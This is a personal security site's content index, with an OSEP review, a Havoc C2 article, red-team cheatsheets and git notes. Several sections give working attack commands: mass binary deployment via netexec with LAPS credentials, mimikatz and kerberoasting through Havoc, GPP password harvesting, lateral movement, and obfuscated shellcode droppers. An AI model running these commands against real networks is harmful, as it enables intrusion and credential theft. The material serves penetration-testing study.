{"/about/":{"data":{"":"","other#Other":"\nI’m just a monkey lost in a human’s world. This website is my temple. I type on keyboard, code appears. Sometimes the code works, sometimes it doesn’t. But you can’t blame me. I’m just a monkey in a human’s world.\nMy monkey duties include typing on keyboard, clicking on mouse, hitting computer with wrench until IT comes running. But they can’t get mad, they can’t fire me. I’m just a monkey in a human’s world.\nSometimes I finish cigarette and breath in oxygen. This temporary burst of energy helps me do incredible things, like type on computer fast, break software, make machine go brrrrrrrrrr. And then cigarette comes back, and stops me in my tracks. But you can’t blame me. I’m just a monkey in a human’s world.\n~ fyx(me) - A monkey in a human’s world\ntldr do hack write code type on keyboard loose CTFs against cracked 15 year olds with 80 years of hacking experience self whoami.txtprogrammer, red teamer, pentester, and jack of all trades with a general passion for pretty much anything cyber. certifications Current list of certifications I’ve achieved.\nOffensive Security Web Expert (OSWE) Offensive Security Experienced Penetration Tester (OSEP) Certified Red Team Operator (CRTO) Certified Red Team Professional (CRTP) Offensive Security Certified Professional (OSCP) CREST Practitioner Security Analyst (CPSA) CREST Registered Penetration Tester (CRT) contact Messages without cute cat or monkey pictures have a higher chance of landing in my spam folder. Do what you will with that information…\nsocials @_fyxme email # email in python def get_email(domain): return \"fegv\" + \"@\" + domain print(get_email(\"proton.me\")) Too hard? Just use this…\nI found this email by bruteforcing protonmail’s username validation endpoint. Couldn’t be bothered to find enough proxies to rotate them and find a valid 3 letter address… Might revisit this in the future.\nwebsite This website is an attempt to document research I do, bugs I find, things I break, tools I make, and useful resources or knowledge I come across. Documenting some of the work I’ve made public.\nThe website is always a work in progress… Your Mileage Will Always Vary.\nsitemap technologies The following tools, libraries and services are used to maintain the website:\nhugo | golang static site generator hextra | hugo theme used as a base (this has been heavily customised and I will most likely fork and divert from it sooner or later) github pages | website hosting cloudflare | domain name renewal (originally registered on namecheap) giphy | da monkee gifs custom python scripts | maintenance, deployment \u0026 other shenanegans to make it compatible with obsidian helpers Finding giphy media url The gif websites are super stingy about sharing their .gif urls… I can never remember how to find it, so here goes nothing:\nTake the url: https://giphy.com/gifs/monkey-phone-cell-l41lVsYDBC0UVQJCE Extract the end bit: l41lVsYDBC0UVQJCE Put the fluff around it: https://media.giphy.com/media/\u003cend bit\u003e/giphy.gif Profit: https://media.giphy.com/media/l41lVsYDBC0UVQJCE/giphy.gif ^ This also works for giphy “clips”\nAlternatively, you can use this “downloader”.\nOther The almighty OG website The Almighty OG Website The OG website was a minimalist single page HTML website which would be updated manually and simply contained redirect links to GitHub Markdown files in various repos.\nThe simplicity of it was great but I wanted something more robust with easy markdown conversion and simple site navigation. Also wanted the content to be hosted and displayed on the fyx.me domain and not in random repos on Github.\nSince the website is a self contained html page its easy to keep around and host.\nIf you want to check it out, it’s available here.\nsimplicity This is the only CSS required to style the whole page. Isn’t that just beautiful…\nbody { font-family: monospace; display: flex; } nav { margin-right: 2em; padding: 1em; } ul { margin: 0; padding-left: 1em; } ul.spaced-list \u003e li { margin-bottom: 1ex; } hr { border: 1px solid gray; margin: 2ex 0; } a { text-decoration: none; } a:hover { text-decoration: underline; } body { background-color: #111; color: #fff; } a { color: #3cf; } a:visited { color: #c6f; } ","self#self":"","tldr#tldr":"","website#website":""},"title":"About fyx(me)"},"/articles/":{"data":{"":" Important\nThe layout of this section is a work in progress. Articles below are new articles I’ve written after migrating to fyx.me v2.0.\nOld articles, CTF/boot2root writeups and post-mortem links can be found at the old website here"},"title":"articles"},"/articles/creating-a-havoc-module-to-run-commands-on-all-agents-at-once-and-map-out-an-environment-passively/":{"data":{"":" Tldr\nWrote a Havoc Module to run commands on all connected agents, used it to gather network information on all compromised hosts by performing packet captures, and analysed the data offline to map out the environment and find open ports and services. The tool can be found here: https://github.com/fyxme/havoc-runall-poc\nDo you sometimes get this urge to run rm -rf on all your beacons at once? Or maybe you’re a ransomware operator who wants to execute your ransomware BOF through all your beacons? Worry no more, the Havoc Run All Module is here!\nThe Havoc Run All Module allows you to run commands on all connected agents, which could prove useful when searching for something, running post-exploitation on a number of hosts and/or downloading files on all compromised hosts at once.\nNote: executing ransomware this way would actually be stupid since you’d need to have a beacon on every machine you wish to ransom… As is currently done in ransomware operations, its much easier to use GPO, Intune, SCCM or any other software deployment tool. This is only a fun project which will increase IOCs when used and increase the likelihood of being compromised… So ackchyually, I’m doing blue team a favor here. Its ok… Thank me later.","conclusion-and-use-cases#Conclusion and use cases":"The Havoc Run All Module is a fun tool to play around with in test environments but since it generates a lot of IOCs, it wouldn’t be too practical in Red Team engagements unless you’re looking to go all out and validate that the Blue Team can catch you.\nI do see some potential within practice environments like HTB Pro Labs, OffSec OSEP, etc. It’s overall really fun to use and does feel pretty powerful when you don’t have to worry about OPSEC! Combine it with a BOF that searches for flags or does post-exploitation looting and you’ve got yourself a powerful weapon for those pesky practice environments which hide loot everywhere.\nPassive Network Monitoring and analysis has a lot of potential for attackers willing to expand their knowledge of the network without having to actively probe ports and hosts. Definitely something I will investigate further in the future…\nThe Havoc Run All Module can be found here: https://github.com/fyxme/havoc-runall-poc","figuring-out-which-of-my-beacons-are-alive#Figuring out which of my beacons are alive":"The first use case I found for this was to sync all my beacons (using the sleep command) and finding out which of my beacons are alive by running a dummy BOF.\nTo sync all the beacons, I first run sleep 0 on all of them to get them to return all at the same time (some limitations in the current version of Havoc make it unreliable when the beacons do not return at similar intervals):\nhavoc \u003e runall sleep 0 All Havoc beacons synced together To get details about the alive beacons, I’ve created a command (getalive) which run a dummy BOF on all the agents. This BOF returns the hostname and the username of the underlying beacon allowing us to check which beacons are actually alive and which ones might be dead:","future-research#Future Research":" Explore packet analysis further. Develop additional analysis tools to filter, search and visualise PCAP data. SYN-ACK responses indicates open ports but may miss ports if the packet capture was started after the connection occurred Turn the packet analysis C tools into a BOF that can also capture network packets and passively identify open ports without having to export large Packet Capture files over C2 comms Look into trying out GRASSMARLIN which is targeted towards Industrial Control Systems (ICS), however could still be useful to map out an environment from a PCAP ","passively-mapping-out-an-internal-environment-using-packet-captures#Passively mapping out an internal environment using Packet Captures":"With firewalls, network access controls, and network segmentation, it can be tough to identify which machines can talk to which ones. There are tools out there that can help map out a network environment but they require active scanning of target devices. You could also use DNS cache to get an idea of what the machine is trying to talk to but it does not necessarily correlate with what it can reach (eg. DNS for a machine that is firewall/blocked off).\nInstead, we can look at currently outgoing data and see if we can create our own map from passively analysing network packets. To do this, we would need access to Network Routing Device like a switch or we can rely on running packet captures on a large number of hosts within the environment. Since we’re testing out the Havoc Run All Module (and there’s no network device we can compromise), we’ll use the second option and perform a packet capture on all of the hosts we have compromised.\nGathering the data We want to do this in the easiest way possible, without having to install tshark/wireshark or any other tools on the device. Since we’re targeting Windows machines, there are built-in tools we can use:\nThe old school netsh command which can capture network traffic using the netsh trace sub-command The new school pktmon (Packet monitor) which is built-in to Windows, starting in Windows 10 (version 1809). I wasn’t sure which Windows Host versions the environment was running and I didn’t want to check if every single one of those supported the new(ish) pktmon command so I opted for the trusty old school netsh command.\nNote\nIf you need to execute a binary (eg. deploy a beacon) on multiple hosts at once, netexec is a great tool for that.\nnetexec is very powerful and allows you to perform multiple actions with only one command. As such, you can build a netexec (also know as nxc) command to retrieve the LAPS password for multiple hosts, authenticate as the local administrator user to those hosts, upload a binary and execute it via command prompt (or PowerShell) in a single command:\nnxc smb targets.txt -u \"$LAPSUSER\" \"$PASSHASH\" --put-file \"$SOURCE_BIN\" \"\\\\Windows\\\\Temp\\\\$TARGET_BIN\" -x \"C:\\\\Windows\\\\Temp\\\\$TARGET_BIN\" --exec-method atexec --laps where:\ntargets.txt - a text file containing a list of targets you want to compromise $LAPSUSER - the user with permission to access the LAPS password in LDAP $SOURCE_BIN - the binary you wish to upload $TARGET_BIN - the binary name on the receiving host After deploying my beacons using nxc, I was able to connect to them in Havoc and they started pinging back periodically as expected:\nI then started a trace on all the beacons at once using the following commands:\n# start the trace runall powershell netsh trace start capture=yes tracefile=C:\\windows\\temp\\cap.etl # wait like 5-10 minutes for traffic to be generated runall powershell netsh trace stop # wait like 3-5 minutes until the trace is consolidated Console from one of the agents receiving the command Data collection and consolidation takes some time but once it’s completed you should see a message as such:\nConsolidation of data into CAB file At this point we have an ETL file (Microsoft Event Trace Log File) which can be opened by ETW-centric tools like Microsoft Message Analyzer, but cannot be opened by Wireshark and co. Ideally, we want a file format that is supported by most tools which analyse network data, aka we want a PCAP or PCAPng file. As such we can convert the .etl file into a .pcapng file using the etl2pcapng utility tool.\nI couldn’t be bothered to download all the .etl files to a local Windows VM so I’m using noconsolation (A BOF that runs unmanaged PEs inline) to execute etl2pcapng and convert all trace log files to .pcapng:\n# running etl2pcapng to convert etl to pcapng directly on the hosts # --no-output needed on certain OSes like Windows 2016 Server runall yesconsolation --no-output /home/lo/tools/etl2pcapng.exe C:\\windows\\temp\\cap.etl C:\\windows\\temp\\cap.pcapng Converting .etl to .pcapng directly on the hosts Warning\nThere is an issue with some of the automatically imported Havoc BOFs (commands) which cause the client to crash under certain conditions. For example running runall noconsolation will crash the client. To fix it you need to import the BOFs yourself, which is what I’ve done here with the yesconsolation command (noconsolation -\u003e yesconsolation). This is not something I have control over, however from the code updates I’ve seen, it should be fixed in the Havoc re-write version.\nDownloading \u0026 Merging the data At this point we have a .pcapng file for each host which we need to download and merge so we can analyse the data offline. To do this we can use the built-in Havoc download command to retrieve the .pcapng files:\nrunall download C:\\windows\\temp\\mycoolnetwork.pcapng Depending on how large the PCAP is, this may take a while… You can use the last seen tab to know when the file has finished downloading vs when it’s still downloading:\nOnce downloaded, you can navigate to your local Havoc install and find the data/loot folder which is where the downloaded files will be located:\nNow we don’t want to deal with each packet capture one at a time, so instead we can merge them into a single large PCAP file using the mergecap tool (which is part of Wireshark):\nSome tools might not work with pcapng (eg. the free version of NetworkMiner) and require the old school pcap format instead, which we can easily create using tshark (part of Wireshark as well):\nThe old school PCAP format does not have all the bells and whistles of the PCAPng format and therefore may loose some data during conversion. This explains the discrepancy in the file sizes above.\nAnalysing the data Note\nWe didn’t filter the data before combining it, which means 2 systems talking to each other will have generated the same packets (in opposite direction) which would have been captured during data gathering. Hence, if we captured the data correctly, we can assume that we have at least double the amount of packets needed (disregarding packet loss). I’ll leave the packet filtering as an exercise for the reader. Alternatively, we could use the extra packet to compare both hosts to ensure no packet manipulation is being performed between the hosts and perform additional data analysis.\nIgnoring the duplicate packets, we can load this fat PCAP into NetworkMiner to get a quick overview of the environment. You can run NetworkMiner from Linux using mono (the Cross platform, open source .NET framework):\nmono NetworkMiner.exe --noupdatecheck Because its a big file and we’re running NetworkMiner via mono on Linux, this takes a while to process… Probably worth taking a coffee break here. Alternatively, you can probably parse this much faster on windows. But I’m lazy so imma go with the coffee break route instead…\nedit: I’ve been here a while… this is taking a looong time.\nAfter it finally finishes parsing, we get an idea about what we managed to capture, namely:\n44 hosts 1389 DNS queries 61 Credentials (these are mostly hashes) A lot of files (?!) A single host on the 10.10.14.0/24 network, namely my host since I performed the capture when no-one else was using the environment NetworkMiner Hosts Tab NetworkMiner Credentials Tab We can use tshark to generate a table like output of IP Communications and see which hosts are communicating together:\nI tried playing around with python tools but because the PCAP is of decent size, it was quite slow so I resorted to writing a good ol’ C program to parse the PCAP using libpcap which generates a DOT file that can be converted to a graph using GraphViz:\nThe graph above already highlights a few things about the environment:\nRED: my Kali VM; GREEN: the two entrypoints I’m using to gain access to the internal network (ie. jumpboxes); BLUE: the node which connects to nearly every other node in the domain aka the domain controller. We can also see the domain controller is talking to other nodes that I might not have compromised or have no beacon on, namely the IPs 10.10.120.20 and 10.10.122.20. There’s a good reason these don’t appear to be connected to any other node on the network but I’ll this as an exercise for the reader.\nWe can also see the two Google DNS IPs (8.8.8.8 and 8.8.4.4) being connected to the Blue node which indicate that the domain controller is likely using Google DNS server for external DNS queries. It also connects to multiple root name servers, namely e.root-servers.net (192.203.230.10) and g.root-servers.net (192.112.36.4).\nAs such, we have a decent overview of the network. We can also start performing additional data analysis to for example find open ports and services on the network like HTTPS (port 443), RDP (port 3389) and Microsoft SQL Server (port 1433):"},"title":"Creating a Havoc Module to run commands on all agents at once and map out an environment passively"},"/articles/osep-exam-review/":{"data":{"":"","offsec-osep-exam#Offsec OSEP Exam":"Early December, I attempted the OffSec Experienced Penetration Tester (OSEP) certification exam. I survived a failed computer firmware update, slow and inconsistent internet speeds due to living in a 3rd world country (aka Canada) and a sleeping proctor who took an hour to unfreeze my camera and VPN but in the end…\nI successfully passed the exam! There’s a lot of OSEP reviews out there so I will try to minimise overlap with what overs have said. Use your google fu to find these!\nNevertheless, I’ve compiled a number of tips that will hopefully help you preparing for and taking the OSEP exam.\nPreparation We need to prep for exams? I thought the exam was the prep... Learn to use your tools, especially if you’re using a C2 other than the one taught in the course (ie. Metasploit).\nTJNull has a lot of great suggestions in his OSEP list of vulnerable machines. A lot of these can be used to test your tools in a controlled environment.\nMaking cheatsheets could also be useful especially when you do a lot of these (ie. boot2roots, CTFs or AD environments). Saves you time to just copy paste the commands directly instead of having to run -h / --help every 2 seconds…\nChoice of tools C2 Bazaar\nHavoc quick reference guide\nThe course is centered around Metasploit C2 but use any open source C2 you want and are comfortable with. I used havoc because I wanted to play around with it.\nDon’t be a hero and try to do everything from C2. If you know how to do it from Kali Linux (eg. impacket, netexec, etc) then use that…\nAs long as you have screenshots of retrieving the flag from an interactive shell, you’re gucci.\nAD Enumeration Bazaar\nAD Enumeration quick reference guide\nBloodhound is overrated in these small environments. Plus, the bloodhound client and/or server (depending on which version you are using) is super resource hungry.\nI’d recommend doing manual enumeration using tools like Powerview/powerview.py or adsearch.\nDefence Evasion Important\nYou’re not tested on OPSEC. You can do risky things w/o worrying about OPSEC and whether you should look at less noisy solutions. Just blast things and see what sticks.\nDon’t be scared to disable everything on the environment (eg. firewall, AV, running software), this isn’t production, this isn’t a client’s environment. You’re here to show you understand the vulnerabilities, misconfigurations and can bypass security configurations. If you need to, just revert and if you’re scared add a limitation for the report explaining you did this because you are aware that this is non-production environment and that the “client” (aka offsec) can reset the environment to its original state.\nUse your own time to explore other solutions which do not require disabling defences.\nScreenshot tool Note\nIt’s better to take more then less screenshots… I’d recommend taking fast dirty screenshots, don’t worry about extras and what not, just paste them in your note taking tool like obsidian and reformat them later when writing up the report.\nJust use flameshot, there’s no better alternative.\nYou can also remap your kali and/or host’s machine printscreen button to it.\nMakes your life easier… Simply Screenshot \u003e Edit it from the flameshot popup \u003e Copy \u003e Paste to your favorite editor (eg. Obsidian).\nOther tools You don’t need to do everything from the C2. It’s a free for all, the only requirement is to demonstrate that you have access to the machines in the environment and can reach the flags with an interactive shell, nothing else.\nSo make use of any AD tools you know, including those you can run through proxies (ie. proxychains) like impacket, netexec and powerview.py.\nThe Exam itself Important\nExam completion requirements and tips:\nA total of 100 points (10 points for each proof.txt and/or local.txt flags) OR you reach the end goal and retrieve the secrets.txt file from the target system. Once you reach 100 points, I would focus on ensuring you have all you need for the report (ie. screenshots for the attack paths, valid proof screenshots, notes, etc) and that you have submitted all you flags to the provided control panel. This ensures you don’t forget anything before running out of time. Proof screenshots have a specific format, they need to be taken from an interactive shell and include the (proof|local|secret).txt file contents and the ipconfig of the machine. Also recommended to add whoami in the screenshot because why not (it can help you with write ups later on). You do not need to use a C2 for everything in the exam. The only requirement is that you have screenshots of the flags from an interactive shell. So you can exploit the machine and then drop a beacon on there for example to take your screenshot. Completion txt files :\nproof.txt, local.txt - located on User’s home folder, or other publicly reachable folders. secrets.txt (its the last box on the environment so don’t just count on that to pass… if you’re stuck on one path, check the other paths.) In my opinion, the exam is a lot more straightforward / linear then you think compared to the OSCP.\nTake time to eat/sleep/shower/talk to friends (lol imagine having friends and taking a 3 day proctored exam).\nMake sure to read the OSEP Exam Guide and OSEP Exam FAQ in details before the exam.\nProctoring Caution\nDon’t forget a government issued ID to show to the proctor when the exam starts (don’t do like i did and panic to find any form of government id when they requested it…)\nFor the proctoring tool, I had to disable Wayland on Debian Linux because it was interfering with screen sharing (ie. could only share full screen and not individual screens).\nI lost close to 1 hour at the beginning because of this. I was told that if I could not get the proctoring tools working within the hour, they will end my exam and cancel it (ie. same as did not attend).\nHence, I would highly recommend that you test screen sharing to ensure you can share all your screens individually before the start of the exam. (And install the required extension if you end up using brave or chrome)…\nI ended using brave with the Offsec memory hogging screenshare extension… Now that I’ve read more OSEP reviews, I should have tried with firefox after I fixed my Wayland issue.\nTldr\nUse firefox. If you can only share your full screen and are running linux, it’s probably a Wayland issue (check online for fixes). If that doesn’t work, see if using brave with the screen share plugin works.\nAs with all OSEP exams, don’t worry about crashes (VPN, VM, Computer, Proctoring tool, etc). Just message them in the chat explaining what happened (ie. poor software and/or hardware, shit crashes). They’re usually pretty ok with it. Just restart, reshare and explain what happened.\nIf the proctor is not responding then contact them via this chat. When I had issue and my proctor wasn’t responding for like 1 hour and I needed them to unfreeze the webcam/VPN, I messaged them here and someone answered pretty much straight away and nudged the proctor to respond to me and fix my environment.\nThe dev Windows VM They give you a Windows virtual machine that is configured with all the tools required for writing and compiling c sharp, office macros, etc. Machine has Defender disabled, all the tools you need and has quite a lot of hardware resources.\nIt’s probably the fastest machine in the environment… I recommend to make use of it unless you run your own Windows VM where you can do those kind of things easily. Credentials are on the internal exam control panel.\nThe Exam Report You have 24 hours to finalise and send your report after the exam ends. Make sure you follow the instructions on how to send your report properly (ie. 7z without password, submit on that portal, etc).\nIf you took notes and a lot of screenshots during the exam, this should be a breeze and the formatting should be the most time consuming part.\nI personally used the following offsec exam markdown report template which has some nice report layouts and allows you to take notes in Markdown and generate the final PDF report directly without having to touch MS Word.\nWarning\nWhen installing the Eisvogel latex template with that Offsec Markdown template, don’t use the v2.5 of the Eisvogel latex template because its bugged for images and will not resize/center them properly.\nRef: https://github.com/Wandmalfarbe/pandoc-latex-template/issues/405 Ref2: https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/issues/63\nIf you decide to use that tool, be wary that you may need some bash magic to convert links and other things that might break during conversion. You can look at the Github issues on the repo to look for help but if you’re not confident you can fix the formatting yourself quickly then I wouldn’t recommend it and suggest using the Offsec Word Document instead.\nOnce you’ve submitted the report, you can finally start cleaning up, respond to everyone you ghosted over the past few days and get back to scrolling twitter and watching anime while you wait for Offsec’s email response.\nFamous last words One thing that always amazes me in these long exams is that you can get an insane amount of stuff done, learned and researched in just 48 hours when you disregard all other life distractions and become a hermit.\nProbably not good in the long term but interesting food for thought…\nGood Luck Comrade! "},"title":"OffSec Experienced Penetration Tester (OSEP) Exam Review"},"/bazaar/":{"data":{"":" Warning\nThe bazaar is at a very early stage. Anything and everything may change for better or worse.\nA bazaar or souk is a marketplace consisting of multiple small stalls or shops, especially in the Middle East, the Balkans, Central Asia, North Africa and South Asia. They are traditionally located in vaulted or covered streets that have doors on each end and served as a city’s central marketplace.\nIn other terms, the cyber bazaar is a place for structured chaos where you can (sometimes) find cyber things you need (and sometimes stuff you don’t need).\nA wiki / cheatsheet combination of some sorts with some magic dust sprinkled in there.\nImportant\nThe goal is to have quick references to various tools and knowledge that is helpful for cybersecurity, speedrunning ctfs/boot2root/certs and other useful programming knowledge.\nA lot of the techniques described here are very noisy and might not be OPSEC safe. Tread with caution and do your own research if you want to utilise some of the techniques during pentesting or red teaming engagements.","faq#FAQ":"Will I find everything I need here? No\nAt what stage of completion is this? Eternal work in progress\nWhy make yet another cybersecurity cheatsheet? I like the stock\nWhere did you get the image? Yonked it at gunpoint from an AI on the internet.\n“I’ve seen this before, you yonked it from X…” X borrowed from Y who borrowed it from Z who asked an LLM to generate the code for him.\nThe references try to highlight where the code or information was found. If references are missing, feel free to contact me and I will be happy to update them."},"title":"bazaar"},"/bazaar/c2-and-red-team-tools/":{"data":{"":"","#":" Tbd\nPivoting does your ticket have network permissions? sometimes easier to use ptt to pass the ticket or steal a token from the machine that has network privilege on behalf of the machine "},"title":"_index"},"/bazaar/c2-and-red-team-tools/havoc/":{"data":{"":"","#":" Note\nC5Spider (the Author) is currently doing a re-write of Havoc which will most likely improve it’s capabilities and stability. See the havoc repo’s rewrite branch for more details.\nHavoc is still a new C2 framework and has some limitations, things it cannot do and things that may break. Also the havoc client can be a little resource hungry… During OSEP Exam, my VM crashed a few times because of it or the havoc client process was killed. Also had computer crashes but that is most likely a combination of this and Offsec’s proctoring extension.\nCommands # https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD#commands # ~~~ Non-exhaustive list below ~~~ # fork and run. nice to start a second beacon in case the first one dies or something shellcode spawn x64 /payloads/demon.x64.bin # ADCS adcs_enum # Kerberoasting get-spns kerberoast \u003cspn\u003e # run PE inline (exe) - builtin to Havoc - https://github.com/fortra/No-Consolation noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess # Socks Proxy socks add 4242 # dont forget to edit your /etc/proxychains4.conf proxychains4 netexec smb dc01.pinecorp.local -u deamian -p Winter2000 -M gpp_autologin -M gpp_password # port forwarding (usefull to forward a webserver or something) # w/o for firewall settings on the beacon's host rportfwd .... # enum local sessions enumlocalsessions sessions quser schtaskenum netview klist # dir remote share and cat content of file dir \"\\\\dc01.pinecorp.local\\SYSVOL\" cat \"\\\\dc01.pinecorp.local\\SYSVOL\\pinecorp.local/Policies/{EA980932-BE55-11EF-B70F-579199F31135}/Machine/Preferences/Registry/Registry.xml\" # lateral movement # requires LatLoader bof: https://github.com/icyguider/LatLoader # trkwks4185 is the name of your pipe as defined in your SMB listener config LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin pivot connect dev01.pinecorp.local trkwks4185 # search for files that end in .psm1 recursively (good to find flag.txt and what not) dir C:\\users /s /b /f /ends .psm1 Modules enumfiles (File search / grep) Tbd\nLatLoader (Lateral Movement) LatLoader | LatLoader is a PoC module to demonstrate automated lateral movement with the Havoc C2 framework. # lateral movement LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin # if it doesnt return ExecMethod Succeeded! but writes successfully, the script might need to be realoaded.. script manager \u003e LatLoader \u003e right click \u003e reload # dont forget to connect to host if you used an smb beacon pivot connect dev01.pinecorp.local trkwks4185 Shhhhloader (Obfuscated Dropper) Shhhhloader | Syscall Shellcode Loader Decent obfuscation tool. However, can sometimes break because of obscure havoc profile configurations…\nUse the GUI button in the navbar to generate your payload.\nWarning\nThe tool currently doesn’t support grabbing the payloads from the listeners directly. You have to generate them prior and upload them via the file input in the GUI.\nUAC-BOF-Bonanza (UAC Bypass BOF) UAC-BOF-Bonanza Tbd\nUntested but look interesting\nHighBorn (UAC Bypass BOF) HighBorn Tbd\nUntested but look interesting\nPre-compiled binaries # run PE inline (non C# exe) noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute (C# exe) dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess Dotnet C# binaries:\nhttps://github.com/r3motecontrol/Ghostpack-CompiledBinaries https://github.com/Flangvik/SharpCollection Havoc Profiles Warning\nI’ve had issues with listeners not working properly and not binding correctly. I recommend adding the listeners to your profile directly and if you have to modify or update one, do it from the profile config file and restart the server. (You will not loose your data… but beacons might die if you change the communication protocols, ports etc…)\npython3 havoc_profile_generator.py Ref: https://github.com/Ghost53574/havoc_profile_generator\nLimitations Havoc doesn’t support import-powershell so you need to do it yourself when running a powershell command:\npowershell import-module C:\\windows\\tasks\\somemodule.ps1; Invoke-ModuleCMD Ref: https://github.com/HavocFramework/Havoc/issues/492#issuecomment-2198213157"},"title":"Havoc"},"/bazaar/c2-and-red-team-tools/malware-droppers/":{"data":{"":"","#":" Important\nUse open source malware droppers when playing in testing environments… You don’t want to burn your own dropper when playing around.\nHooka Can be run in Linux and generate Windows binaries (cross platform compilation) Golang # simplest command ./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe # the more shit you add the buggier it might be... and less likely to run # glhf ./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe --proc explorer.exe _ _ _ _ | | | | ___ ___ | | __ __ _ | | | |_| | / _ \\ / _ \\ | |/ / / _` | | | | _ | | (_) | | (_) | | \u003c | (_| | |_| |_| |_| \\___/ \\___/ |_|\\_\\ \\__,_| (_) [*] Obtaining shellcode from /home/lo/webserver/smb.x64.bin \u003e Shellcode is in raw format [*] Defining evasion techniques... [*] Using suspendedprocess technique to execute shellcode [*] Obfuscating variables and functions... [*] Compiling shellcode loader... \u003e Payload format is set to EXE \u003e go build -o imdone.exe loader.go \u003e 3154432 bytes written to imdone.exe [+] Loader file entropy: 6.9330213473661955 [+] Checksums: \u003e MD5: 6666b187280d31537b083c69631b636c \u003e SHA1: 64ff907b7c9d94564ce5857145dd70d8b4761044 \u003e SHA256: d9b5fc90dcd569ae2f00b7dc7bb1ddeae28e1cacc201628afa7d809061dfe561 [+] Shellcode loader has been successfully generated Invoke-Obfuscation https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide https://github.com/danielbohannon/Invoke-Obfuscation https://x.com/dmcxblue/status/1879176230098157962?t=bhHdazl7dNhn39P3g5jVpw\u0026s=19 References https://github.com/mttaggart/rustyneedle https://github.com/joaoviictorti/RustRedOps "},"title":"Malware Droppers"},"/bazaar/computer-science--programming/":{"data":{"":""},"title":"_index"},"/bazaar/computer-science--programming/git/":{"data":{"":"","#":"Git signing Get git signing key ID:\n# get keys gpg --list-secret-keys --keyid-format SHORT # key id is the one after rsa4096 rsa4096/XXXXXXXX Setup .gitconfig to sign automatically:\n.gitconfig[user] useConfigOnly = true email = ... signingkey = \u003cXXXXXXXX\u003e [commit] gpgSign = true [tag] gpgSign = true ref: https://git-scm.com/book/ms/v2/Git-Tools-Signing-Your-Work ref: https://withblue.ink/2020/05/17/how-and-why-to-sign-git-commits.html\nGit diff(ing): Generating and Applying code patches # GENERATING # head -1 git format-patch -1 HEAD # head - 3 to head git format-patch HEAD~3..HEAD # generating a single patch across multiple commits git format-patch cc1dde0dd^..6de6d4b06 --stdout \u003e foo.patch # generating diff from tags (can use --stat to only get the number of lines changed) git diff 2.0.0 1.0.0 --stat # generating patches for uncommited changes git diff \u003e my-changes.patch # APPLYING git apply \u003cpatch-file\u003e ref: https://www.geeksforgeeks.org/how-to-generate-and-apply-patches-with-git/\nUsing linux diff command Can also be done from linux diff commands directly:\n# GENERATING # new code has the new changes we want to make as part of the patch diff -ru \u003cold code\u003e \u003cnew code\u003e \u003e mychanges.patch # APPLYING # need to be in the directory in which you want to make the diff changes from patch -i mychanges.patch Encrypted git repos Tbd\nhttps://git-annex.branchable.com/tips/fully_encrypted_git_repositories_with_gcrypt/ Git Convetional Commits See versioning"},"title":"git"},"/bazaar/computer-science--programming/orchestration-workflows/":{"data":{"":"","#":"Workflow orchestration tldr: A fancy cron runner with advanced workflow management, status monitoring, alerting, etc…\nCyber security use cases:\nMonitoring tasks Scheduled offensive/defensive scan triggers Daily Enumeration workflows data pipelines and more… Prefect Prefect offers modern orchestration solutions to empower data teams to build resilient workflows that scale with versatile resource needs.\nRef: https://www.prefect.io/\nApache Airflow Apache Airflow® is a platform created by the community to programmatically author, schedule and monitor workflows.\nRef: https://airflow.apache.org/\nDifference between CI-CD runners and Workflow orchestrators Difference between CI-CD runners like Github actions and Workflow orchestrators like Airflow and Perfect?\nAs to the differences, GitHub actions is generally a “on commit, do something”, like build an image, run tests, linting, build documentation, etc. It’s a tool generally to automate actions on your repository.\nAirflow and Prefect are orchestration systems. They’re not tied to a repo and can do a wider variety of things. For example, every day at 4am run a daily report for the prior business day. Every weekend retain our ML models by spinning up some Amazon ECS tasks. Every half an hour hit an external API and digest it’s data into our data lake.\n[…] GitHub actions… Can be shoehorned to do orchestration in a limited fashion, but it’s not quite the intent.\nPrefect and airflow are, however, explicitly designed to do it. For Prefect, that means I dictate how things are run (containers, dask workers, other), I can specific what to happen on failure (retry, pagerduty alert, slack warnings, etc), and many other things that in general make my life easier bridging the proof of concept to fully productionised system easier.\nRef: https://www.reddit.com/r/mlops/comments/13ulfux/airflow_vs_github_actions_workflows/"},"title":"orchestration (workflows)"},"/bazaar/computer-science--programming/versioning/":{"data":{"":"","#":"Semver : Semantic versioning ref: https://semver.org/\nGiven a version number MAJOR.MINOR.PATCH, increment the:\nMAJOR version when you make incompatible API changes MINOR version when you add functionality in a backward compatible manner PATCH version when you make backward compatible bug fixes Additional labels for pre-release and build metadata are available as extensions to the MAJOR.MINOR.PATCH format.\nOther ref:\nhttps://www.conventionalcommits.org/en/v1.0.0/ Conventional commits Tldr\nCommit formats: feat(parser): add ability to parse arrays Tags: feat, fix, build, chore, ci, docs, style, refactor, perf, test\nBreaking changes: a footer BREAKING CHANGE:, or appends a ! after the type/scope (eg. fix(parser)!: fixed CVE-XXX by adding input validation)\nThe Conventional Commits specification is a lightweight convention on top of commit messages. It provides an easy set of rules for creating an explicit commit history; which makes it easier to write automated tools on top of. This convention dovetails with SemVer, by describing the features, fixes, and breaking changes made in commit messages.\nThe commit message should be structured as follows:\n\u003ctype\u003e[optional scope]: \u003cdescription\u003e [optional body] [optional footer(s)] The commit contains the following structural elements, to communicate intent to the consumers of your library:\nfix: a commit of the type fix patches a bug in your codebase (this correlates with PATCH in Semantic Versioning). feat: a commit of the type feat introduces a new feature to the codebase (this correlates with MINOR in Semantic Versioning). BREAKING CHANGE: a commit that has a footer BREAKING CHANGE:, or appends a ! after the type/scope, introduces a breaking API change (correlating with MAJOR in Semantic Versioning). A BREAKING CHANGE can be part of commits of any type. types other than fix: and feat: are allowed, for example @commitlint/config-conventional (based on the Angular convention) recommends build:, chore:, ci:, docs:, style:, refactor:, perf:, test:, and others. footers other than BREAKING CHANGE: \u003cdescription\u003e may be provided and follow a convention similar to git trailer 